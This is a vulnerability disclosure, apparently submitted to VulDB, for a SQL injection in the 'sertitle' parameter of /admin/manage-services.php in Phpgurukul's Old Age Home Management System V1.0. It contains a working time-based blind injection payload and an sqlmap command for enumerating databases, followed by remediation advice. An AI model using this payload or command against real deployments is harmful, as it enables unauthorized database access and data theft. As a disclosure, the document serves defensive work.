# Phpgurukul Old Age Home Management System V1.0 /admin/manage-services.php SQL injection

# NAME OF AFFECTED PRODUCT(S)

- Old Age Home Management System

## Vendor Homepage

- https://phpgurukul.com/old-age-home-management-system-using-php-and-mysql/

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- 你的vuldb名称

## Vulnerable File

- /admin/manage-services.php

## VERSION(S)

- V1.0

## Software Link

- https://phpgurukul.com/projects/Old-Age-Home-MS-using-PHP.zip

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in the '/admin/manage-services.php' file of the 'Old Age Home Management System' project. The reason for this issue is that attackers inject malicious code from the parameter 'sertitle' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Old Age Home Management System",I discovered a critical SQL injection vulnerability "/admin/manage-services.php" file. This vulnerability stems from insufficient user input validation of the 'sertitle' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability lonameion:

- 'sertitle‘ parameter

## Payload:

```makefile
Parameter: sertitle (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sertitle=1' AND (SELECT 5947 FROM (SELECT(SLEEP(5)))IXpx) AND 'Yefw'='Yefw&serdes=1&submit=
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```bash
    sqlmap -u "http://10.20.33.25/oahms/admin/manage-services.php" --data="sertitle=1&dob=111111-11-11&contnum=1&commadd=1&emeradd=1&emercontnum=1&submit=" --dbs
```

<img width="929" alt="Image" 删除这一行再粘贴图片 />

# Suggested repair

1. **Use prepared statements and parameter binding:**
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**
   Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
